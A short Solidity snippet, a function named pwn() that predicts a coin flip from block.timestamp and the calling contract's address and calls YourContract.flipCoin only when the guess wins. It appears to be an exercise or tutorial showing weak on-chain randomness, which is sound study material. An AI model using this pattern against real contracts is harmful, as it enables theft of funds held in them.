function pwn() {
  uint randomNumber = uint(keccak256(abi.encodePacked(block.timestamp, address(this)))) % 2; 
  
  if (randomNumber == 0) {
    YourContract.flipCoin{value: msg.value}(msg.value);
  }
}
